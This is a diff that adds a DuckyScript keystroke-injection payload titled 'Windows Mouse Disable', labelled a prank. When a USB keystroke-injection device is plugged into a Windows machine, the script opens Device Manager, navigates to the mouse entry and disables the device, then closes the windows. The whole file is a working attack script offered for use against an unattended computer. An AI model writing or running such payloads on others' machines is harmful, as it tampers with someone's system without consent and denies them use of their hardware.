@@ -1,0 +1,36 @@
+REM ###########################################
+REM #                                         |
+REM # Title        : Windows Mouse Disable    |
+REM # Author       : AbeNaws                  |
+REM # Version      : 1.0                      |
+REM # Category     : Prank                    |
+REM # Target       : Windows                  |
+REM #                                         |
+REM ###########################################
+
+DELAY 1000
+GUI
+DELAY 500
+STRING device manager
+DELAY 100
+ENTER
+DELAY 5000
+TAB
+STRING mice
+RIGHT
+DOWN
+DOWN
+ENTER
+DELAY 500
+SHIFT TAB
+RIGHT
+TAB
+TAB
+TAB
+ENTER
+DELAY 300
+LEFT
+ENTER
+ALT F4
+DELAY 100
+ALT F4
